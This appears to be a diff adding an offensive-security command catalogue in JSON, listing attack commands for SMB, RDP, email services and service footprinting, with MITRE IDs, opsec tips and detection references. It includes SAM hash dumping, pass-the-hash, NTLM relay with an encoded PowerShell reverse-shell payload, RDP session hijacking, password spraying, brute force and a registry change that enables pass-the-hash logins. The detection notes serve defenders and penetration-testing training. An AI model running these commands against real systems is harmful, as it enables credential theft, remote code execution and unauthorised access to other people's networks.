+        "description": "Enumerate logged-on users via SMB.",
+        "method": "crackmapexec",
+        "command": "crackmapexec smb {subnet}/24 -u {user} -p '{pass}' --loggedon-users"
+      },
+      {
+        "description": "Extract SAM database hashes via SMB.",
+        "method": "crackmapexec",
+        "command": "crackmapexec smb {target} -u {user} -p '{pass}' --sam"
+      },
+      {
+        "description": "Pass-the-Hash via SMB.",
+        "method": "crackmapexec",
+        "command": "crackmapexec smb {target} -u {user} -H {ntlm_hash}"
+      },
+      {
+        "description": "NTLM relay to dump SAM database.",
+        "method": "Impacket",
+        "command": "impacket-ntlmrelayx --no-http-server -smb2support -t {target}"
+      },
+      {
+        "description": "NTLM relay with PowerShell reverse shell payload.",
+        "method": "Impacket",
+        "command": "impacket-ntlmrelayx --no-http-server -smb2support -t {target} -c 'powershell -e {base64_payload}'"
+      }
+    ],
+    "prerequisites": "Network access to SMB port 445; null session or valid credentials",
+    "opsec": "Null sessions are heavily monitored. Use credentialed access. NTLM relay requires positioning between victim and target.",
+    "detection_ref": "Event 4625 null session attempts; SMB signing enforcement; NTLM relay detection; CrackMapExec behavioral signatures"
+  },
+  "attacking_rdp": {
+    "description": "Attacking RDP services — brute force, Pass-the-Hash, session hijacking.",
+    "mitre": "T1110.003",
+    "commands": [
+      {
+        "description": "RDP password spraying with crowbar.",
+        "method": "crowbar",
+        "command": "crowbar -b rdp -s {target}/32 -U users.txt -c '{password}'"
+      },
+      {
+        "description": "RDP brute force with Hydra.",
+        "method": "Hydra",
+        "command": "hydra -L usernames.txt -p '{password}' {target} rdp"
+      },
+      {
+        "description": "Connect to RDP from Linux with rdesktop.",
+        "method": "rdesktop",
+        "command": "rdesktop -u {user} -p {pass} {target}"
+      },
+      {
+        "description": "RDP session hijacking — impersonate user without password.",
+        "method": "cmd",
+        "command": "tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}"
+      },
+      {
+        "description": "Enable Restricted Admin Mode for PtH RDP.",
+        "method": "reg",
+        "command": "reg add HKLM\\System\\CurrentControlSet\\Control\\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f"
+      },
+      {
+        "description": "Pass-the-Hash RDP login with xfreerdp.",
+        "method": "xfreerdp",
+        "command": "xfreerdp /v:{target} /u:{user} /pth:{ntlm_hash}"
+      }
+    ],
+    "prerequisites": "Network access to RDP port 3389; target running RDP service",
+    "opsec": "RDP brute force generates Event 4625. Session hijacking requires console/admin access. Restricted Admin Mode must be enabled for PtH.",
+    "detection_ref": "Event 4625/4624 RDP logon; failed login rate monitoring; Restricted Admin Mode usage; unusual session reconnection patterns"
+  },
+  "attacking_email_services": {
+    "description": "Attacking email services — SMTP user enumeration, Office365 spraying, POP3/IMAP brute force.",
+    "mitre": "T1110.003",
+    "commands": [
+      {
+        "description": "DNS lookup for mail servers.",
+        "method": "host",
+        "command": "host -t MX {domain}"
+      },
+      {
+        "description": "SMTP user enumeration with smtp-user-enum.",
+        "method": "smtp-user-enum",
+        "command": "smtp-user-enum -M RCPT -U userlist.txt -D {domain} -t {target}"
+      },
+      {
+        "description": "Connect to SMTP service for banner.",
+        "method": "telnet",
+        "command": "telnet {target} 25"
+      },
+      {
+        "description": "Verify if domain uses Office365.",
+        "method": "o365spray",
+        "command": "python3 o365spray.py --validate --domain {domain}"
+      },
+      {
+        "description": "Enumerate valid Office365 users.",
+        "method": "o365spray",
+        "command": "python3 o365spray.py --enum -U users.txt --domain {domain}"
+      },
+      {
+        "description": "Password spray against Office365 users.",
+        "method": "o365spray",
+        "command": "python3 o365spray.py --spray -U usersfound.txt -p '{password}' --count 1 --lockout 1 --domain {domain}"
+      },
+      {
+        "description": "Brute-force POP3 service with Hydra.",
+        "method": "Hydra",
+        "command": "hydra -L users.txt -p '{password}' -f {target} pop3"
+      },
+      {
+        "description": "Test SMTP relay vulnerability.",
+        "method": "swaks",
+        "command": "swaks --from {from_email} --to {to_email} --header 'Subject: Test' --body 'Message' --server {target}"
+      },
+      {
+        "description": "Connect to IMAPS with cURL.",
+        "method": "curl",
+        "command": "curl -k 'imaps://{target}' --user {user}:{pass}"
+      }
+    ],
+    "prerequisites": "Network access to mail service ports (25, 110, 143, 993, 995); target email server accessible",
+    "opsec": "SMTP user enumeration via RCPT TO is logged. Office365 spray via o365spray is harder to detect than direct SMTP. Rate limit attempts.",
+    "detection_ref": "SMTP authentication logging; Office365 Smart Lockout; anomalous login patterns; MFA enforcement"
+  },
+  "footprinting_services": {
+    "description": "Service-specific footprinting commands for DNS, SNMP, NFS, MSSQL, Oracle, and remote management protocols.",
+    "mitre": "T1046",
+    "commands": [
+      {
+        "description": "NS record query to specific nameserver.",
+        "method": "dig",
+        "command": "dig ns {domain} @{nameserver}"
+      },
+      {
+        "description": "ANY record query.",
+        "method": "dig",
+        "command": "dig any {domain} @{nameserver}"
+      },
+      {
+        "description": "DNS zone transfer attempt.",
+        "method": "dig",
+        "command": "dig axfr {domain} @{nameserver}"
+      },
+      {
+        "description": "Subdomain brute-force with dnsenum.",
+        "method": "dnsenum",
+        "command": "dnsenum --dnsserver {nameserver} --enum -p 0 -s 0 -o found_subdomains.txt -f ~/subdomains.list {domain}"
+      },
+      {
+        "description": "Brute-force SNMP community strings.",
+        "method": "onesixtyone",
+        "command": "onesixtyone -c community-strings.list {target}"
+      },
+      {
+        "description": "Brute-force SNMP OIDs.",
+        "method": "braa",
+        "command": "braa {community_string}@{target}:.1.*"
+      },
+      {
+        "description": "Show available NFS shares.",
+        "method": "showmount",
+        "command": "showmount -e {target}"
+      },
+      {
+        "description": "Mount NFS share.",
+        "method": "shell",
+        "command": "mount -t nfs {target}:/{share} ./target-NFS/ -o nolock"
+      },
+      {
+        "description": "Connect to MySQL server.",
+        "method": "mysql",
+        "command": "mysql -u {user} -p{pass} -h {target}"
+      },
+      {
+        "description": "Connect to MSSQL with impacket mssqlclient.",
+        "method": "Impacket",
+        "command": "mssqlclient.py {user}@{target} -windows-auth"
+      },
+      {
+        "description": "IPMI version detection.",
+        "method": "Metasploit",
+        "command": "msf6 auxiliary(scanner/ipmi/ipmi_version)"
+      },
+      {
+        "description": "Dump IPMI hashes.",
+        "method": "Metasploit",
+        "command": "msf6 auxiliary(scanner/ipmi/ipmi_dumphashes)"
+      },
+      {
+        "description": "SSH security audit.",
+        "method": "ssh-audit",
+        "command": "ssh-audit.py {target}"
+      },
+      {
+        "description": "Enforce password-based SSH authentication.",
+        "method": "ssh",
+        "command": "ssh {user}@{target} -o PreferredAuthentications=password"
+      },
+      {
+        "description": "Check RDP security settings.",
+        "method": "rdp-sec-check",
+        "command": "rdp-sec-check.pl {target}"
+      },
+      {
+        "description": "Log in to WinRM server.",
+        "method": "evil-winrm",
+        "command": "evil-winrm -i {target} -u {user} -p {pass}"
+      },
+      {
+        "description": "Execute command via WMI.",
+        "method": "Impacket",
+        "command": "wmiexec.py {user}:'{pass}'@{target} '{command}'"
+      },
+      {
+        "description": "Oracle ODAT — full enumeration.",
+        "method": "odat",
+        "command": "./odat.py all -s {target}"
+      },
+      {
+        "description": "Connect to Oracle database.",
+        "method": "sqlplus",
+        "command": "sqlplus {user}/{pass}@{target}/{db}"
+      },
+      {
+        "description": "Certificate transparency lookup.",
+        "method": "curl",
+        "command": "curl -s https://crt.sh/\\?q\\={domain}\\&output\\=json | jq ."
+      },
+      {
+        "description": "Shodan scan of IP list.",
+        "method": "shodan",
+        "command": "for i in $(cat ip-addresses.txt);do shodan host $i;done"
+      }
+    ],
+    "prerequisites": "Network access to target services; appropriate tools installed",
+    "opsec": "Service-specific enumeration generates service logs. Use targeted queries. Start with passive (OSINT, crt.sh) before active scanning.",
+    "detection_ref": "Service audit logs; anomalous connection patterns; IDS for enumeration tools; rate limiting on authentication services"
+  }
+}
